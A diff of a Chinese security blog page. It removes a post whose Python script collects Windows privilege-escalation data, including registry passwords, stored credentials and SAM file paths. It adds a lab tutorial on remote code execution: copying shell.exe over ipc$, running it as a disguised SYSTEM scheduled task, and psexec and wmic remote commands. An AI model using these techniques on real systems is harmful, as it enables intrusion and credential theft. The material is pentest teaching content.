@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>windows提权辅助脚本 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="windows提权辅助脚本 | 九世的博客">
+  <title>内网下常见的反弹shell | 九世的博客</title>
+  <meta name="keywords" content=" Warring ">
+  <meta name="description" content="内网下常见的反弹shell | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1253,9 +1253,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-windows提权辅助脚本" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-内网下常见的反弹shell" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">windows提权辅助脚本</h1>
+        <h1 class="article-title">内网下常见的反弹shell</h1>
     
     <div class="article-meta">
         
@@ -1264,14 +1264,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">Warring</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-09 18:24</time>
+        创建时间:<time class="date" title="更新时间: 2020-01-20 09:57:21">2020-01-20 09:29</time>
         
     </div>
     <div class="article-meta">
@@ -1293,7 +1293,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网下常见的反弹shell"><span class="toc-text">内网下常见的反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#老年ipc"><span class="toc-text">老年ipc$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec"><span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmic-非交互式"><span class="toc-text">wmic (非交互式)</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1308,231 +1308,35 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>进入到后渗透阶段就涉及到了提权。提权的第一步是信息收集，所以这个脚本因此而诞生。当然Demon哥分享的干货是够干的</p>
-<p><img src="https://i.imgur.com/VJFPdww.jpg" alt=""></p>
-<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>windows提权用到的命令：</p>
-<pre><code>systeminfo
-net user
-net user user1
-ipconfig /all
-route print
-arp -A
-netstat -ano
-netsh firewall show state
-schtasks /query /fo LIST /v
-tasklist /SVC
-net start
-DRIVERQUERY
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;
-sc qc Spooler
-</code></pre><p>等等之类的</p>
-<p>代码：</p>
-<pre><code>import os
-
-def collect():
-    xj=open(&#39;save.txt&#39;,&#39;w&#39;)
-    xj.close()
-
-    print(&#39;[+]什么是操作系统和架构？它缺少任何补丁吗？&#39;)
-    systeminfo=os.popen(&#39;systeminfo&#39;)
-    wmic_qfe=os.popen(&#39;wmic qfe&#39;)
-    for s in systeminfo:
-        print(s,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    for c in wmic_qfe:
-        print(c,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]环境变量有什么有趣的吗？域控制器在LOGONSERVER？&#39;)
-    set=os.popen(&#39;set&#39;)
-    #Get_chiditem=os.popen(&#39;Get-ChildItem Env: | ft Key,Value&#39;)
-    for e in set:
-        print(e,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    #for t in Get_chiditem:
-        #print(t,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]还有其他连接的驱动器吗？&#39;)
-    net_use=os.popen(&#39;net use&#39;)
-    wmic_log=os.popen(&#39;wmic logicaldisk get caption,description,providername&#39;)
-    #psd=os.popen(&#39;Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root&#39;)
-    for ne in net_use:
-        print(ne,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    for g in wmic_log:
-        print(g,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    #for d in psd:
-        #print(d,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]你是谁？&#39;)
-    whoami=os.popen(&#39;whoami&#39;)
-    username=os.popen(&#39;echo %USERNAME%&#39;)
-    for whoa in whoami:
-        print(whoa,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    for m in username:
-        print(m,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]任何有趣的用户权限？注意：“状态”列并不表示用户具有或无权访问此权限。如果列出了该权限，则该用户拥有该权限。&#39;)
-    priv=os.popen(&#39;whoami /priv&#39;)
-    for i in priv:
-        print(i,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]用户在系统上有什么用途？任何未清理的旧用户配置文件？&#39;)
-    ur=os.popen(&#39;net users&#39;)
-    bw=os.popen(&#39;dir /b /ad &quot;C:/Users/&quot;&#39;)
-    #bs=os.popen(&#39;dir /b /ad &quot;C:/Documents and Settings/&quot; # Windows XP and below&#39;)
-    for r in ur:
-        print(r,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-        for w in bw:
-            print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-            #for s in bs:
-                #print(s,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]还有其他人登录吗？&#39;)
-    qwinsta=os.popen(&#39;qwinsta&#39;)
-    for w in qwinsta:
-        print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]系统上有哪些组？&#39;)
-    net_localgroup=os.popen(&#39;net localgroup&#39;)
-    for group in net_localgroup:
-        print(group,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]Administrators组中是否有任何用户？&#39;)
-    net_localgroup_Administrators=os.popen(&#39;net localgroup Administrators&#39;)
-    for administrator in net_localgroup_Administrators:
-        print(administrator,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]用户自动登录注册表中的任何内容？&#39;)
-    reg_query=os.popen(&#39;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;&#39;)
-    for v in reg_query:
-        print(v,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]在Credential Manager中有什么有趣的东西吗？&#39;)
-    cmdkey_list=os.popen(&#39;cmdkey /list&#39;)
-    for l in cmdkey_list:
-        print(l,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]cmdkey /list我们可以访问SAM和SYSTEM文件吗？&#39;)
-    lg=[&#39;%SYSTEMROOT%/repair/SAM&#39;,&#39;%SYSTEMROOT%/System32/config/RegBack/SAM&#39;,&#39;%SYSTEMROOT%/System32/config/SAM&#39;,&#39;%SYSTEMROOT%/repair/system&#39;,&#39;%SYSTEMROOT%/System32/config/SYSTEM&#39;,&#39;%SYSTEMROOT%/System32/config/RegBack/system&#39;]
-    for k in lg:
-        system=os.popen(k)
-        for q in system:
-            print(q,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]安装了什么软件？&#39;)
-    rj=[&#39;dir /a &quot;C:\Program Files&quot;&#39;,&#39;dir /a &quot;C:\Program Files (x86)&quot;&#39;,&#39;reg query HKEY_LOCAL_MACHINE\SOFTWARE&#39;]
-    for j in rj:
-        qw=os.popen(j)
-        for w in qw:
-            print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]程序文件夹中每个人或用户的完全权限？&#39;)
-    icacls=[&#39;icacls &quot;C:\Program Files\*&quot; 2&gt;nul&#39;,&#39;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul&#39;,&#39;icacls &quot;C:\Program Files\*&quot; 2&gt;nul &#39;,&#39;icacls &quot;C:\Program Files (x86)\*&quot;&#39;]
-    for aw in icacls:
-        qdw=os.popen(aw)
-        for rs in qdw:
-            print(rs,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-
-    print(&#39;[+]系统上正在运行的进程/服务是什么？内部服务没有暴露吗？如果是这样，我们可以打开它吗？&#39;)
-    tasklist=[&#39;tasklist /svc&#39;,&#39;tasklist /v&#39;,&#39;net start&#39;,&#39;sc query&#39;,]
-    for t in tasklist:
-        wx=os.popen(t)
-        for p in wx:
-            print(p,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]有没有不带引号的服务路径？&#39;)
-    wmcs=os.popen(&#39;wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;&#39;)
-    for m in wmcs:
-        print(m,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]那里有什么预定的任务？什么定制实施？&#39;)
-    xw=os.popen(&#39;schtasks /query /fo LIST 2&gt;nul | findstr TaskName&#39;)
-    print(xw,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]启动时跑了什么？&#39;)
-    qz=[&#39;wmic startup get caption,command&#39;,&#39;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#39;,&#39;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;,&#39;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run&#39;,&#39;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;,&#39;dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;&#39;,&#39;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;&#39;]
-    for z in qz:
-        xq=os.popen(z)
-        for r in xq:
-            print(r,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]连接了哪些NIC？有多个网络吗？&#39;)
-    ipconfig_all=os.popen(&#39;ipconfig /all&#39;)
-    for all in ipconfig_all:
-        print(all,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]我们有什么路线？&#39;)
-    xpo=os.popen(&#39;route print&#39;)
-    for o in xpo:
-        print(o,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]ARP缓存中的任何内容？&#39;)
-    arp=os.popen(&#39;arp -a&#39;)
-    for p in arp:
-        print(p,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]是否有与其他主机的连接？&#39;)
-    sw=os.popen(&#39;netstat -ano&#39;)
-    for b in sw:
-        print(b,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]防火墙是否已打开？如果是这样配置的是什么？&#39;)
-    fq=[&#39;netsh firewall show state&#39;,&#39;netsh firewall show config&#39;,&#39;netsh advfirewall firewall show rule name=all&#39;,&#39;netsh advfirewall export &quot;firewall.txt&quot;&#39;]
-    for u in fq:
-        fhq=os.popen(u)
-        for f in fhq:
-            print(f,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]还有其他有趣的界面配置吗？&#39;)
-    netsh_dump=os.popen(&#39;netsh dump&#39;)
-    for ump in netsh_dump:
-        print(ump,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]注册表中的任何密码？&#39;)
-    lv=[&#39;reg query HKCU /f password /t REG_SZ /s&#39;,&#39;reg query HKLM /f password /t REG_SZ /s &#39;]
-    for pasw in lv:
-        passwd=os.popen(pasw)
-        for pd in passwd:
-            print(pd,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]是否有可用的sysprep或无人值守文件？&#39;)
-    zi=os.popen(&#39;dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul&#39;)
-    for nb in zi:
-        print(nb,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-
-    print(&#39;[+]有待观察的有趣文件吗？可能在用户目录（桌面，文档等）中？&#39;)
-    sl=os.popen(&#39;dir /s *pass* == *vnc* == *.config* 2&gt;nul&#39;)
-    for lw in sl:
-        print(lw,file=open(&#39;save.txt&#39;,&#39;a&#39;))
-    print(&#39;&#39;)
-    print(&#39;&#39;)
-
-    print(&#39;[*]判断是否存在以下路径&#39;)
-    lss=[]
-    if os.path.exists(&#39;list.txt&#39;):
-        print(&#39;[+]存在list.txt&#39;)
-    else:
-        print(&#39;[-]不存在list.txt&#39;)
-        exit()
-
-    dk=open(&#39;list.txt&#39;,&#39;r&#39;)
-    for r in dk.readlines():
-        qk=&quot;&quot;.join(r.split(&#39;\n&#39;))
-        lss.append(qk)
-
-    for g in lss:
-        if os.path.exists(g):
-            print(&#39;[+]存在 {}&#39;.format(g))
-        else:
-            print(&#39;[-]不存在{}&#39;.format(g))
-
-collect()
-</code></pre><p>测试结果：<br><img src="https://i.imgur.com/tpS2Tob.png" alt=""></p>
-<p><img src="https://i.imgur.com/3KobSkD.png" alt=""></p>
-<p>收集到的信息会写入save.txt<br>save.txt的结果：<a href="https://paste.ubuntu.com/p/dR5QGJBHY2/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/dR5QGJBHY2/</a></p>
-<p>关于提权的两篇文章：</p>
-<pre><code>http://www.fuzzysecurity.com/tutorials/16.html
-https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-</code></pre><p>转载请声明来自422926799.github.io</p>
+        <h2 id="内网下常见的反弹shell"><a href="#内网下常见的反弹shell" class="headerlink" title="内网下常见的反弹shell"></a>内网下常见的反弹shell</h2><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579494134917&amp;di=e8ca9fee1e4b883d51d788c0578e82ba&amp;imgtype=0&amp;src=http%3A%2F%2Fi2.17173cdn.com%2F2fhnvk%2FYWxqaGBf%2Fcms3%2FwhnhwXbkzetmCjm.jpg" alt=""></p>
+<p>在公众号上看到的文章，以前看过。没实验过，算是填坑吧</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>要求：知道管理员凭证</p>
+<pre><code>windows server 2008:192.168.241.172
+widnows server 2008 2:192.168.241.171
+kali:192.168.241.174
+</code></pre><h2 id="老年ipc"><a href="#老年ipc" class="headerlink" title="老年ipc$"></a>老年ipc$</h2><p>建立连接</p>
+<pre><code>net use \\&lt;IP&gt;\ipc$ /user:administrator &quot;&lt;password&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYJ2Q.png" alt=""></p>
+<p>复制shell到目标机</p>
+<pre><code>copy shell.exe \\&lt;IP&gt;\C$\windows\Temp\xxx.exe
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYwV0.png" alt=""></p>
+<p>创建服务并运行</p>
+<pre><code>schtasks /create /tn &quot;plugin_update&quot; /tr C:\Windows\Temp\xxx.exe /sc one /st &lt;time&gt; /S &lt;IP&gt; /RU System
+schtasks /run /tn &quot;plugin_update&quot; /S &lt;IP&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYgM9.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2020/01/20/1PYha6.png" alt=""></p>
+<p>反弹到的meterpreter<br><img src="https://s2.ax1x.com/2020/01/20/1PY7xH.png" alt=""></p>
+<p>执行完之后删除任务</p>
+<pre><code>schtasks /delete /tn &quot;plugin_update&quot; /S &lt;IP&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PYqsA.png" alt=""></p>
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><pre><code>psexec \\&lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;command&gt; #执行命令等待进程终止，并返回结果
+psexec -accepteula \\&lt;IP&gt; -d -u &lt;username&gt; -p &lt;password&gt; &lt;command&gt; #执行命令不过等结果，无交互
+accepteula:此标志禁止显示“许可证”对话框
+-d:不要等待进程终止（非交互式）
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1PtMQJ.png" alt=""></p>
+<p>无交互式不回显<br><img src="https://s2.ax1x.com/2020/01/20/1PtlLR.png" alt=""></p>
+<h2 id="wmic-非交互式"><a href="#wmic-非交互式" class="headerlink" title="wmic (非交互式)"></a>wmic (非交互式)</h2><pre><code>wmic /node:&lt;IP&gt; /user:&lt;username&gt; /password:&lt;password&gt; process call create &lt;command&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/20/1Pt5mn.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1542,12 +1346,12 @@ https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>windows提权辅助脚本</p>
+    <p><span class="copy-title">文章标题:</span>内网下常见的反弹shell</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-09, 18:24:55</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d121753b.html" title="windows提权辅助脚本">http://422926799.github.io/posts/d121753b.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-20, 09:29:59</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-20, 09:57:21</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c0872ef5.html" title="内网下常见的反弹shell">http://422926799.github.io/posts/c0872ef5.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
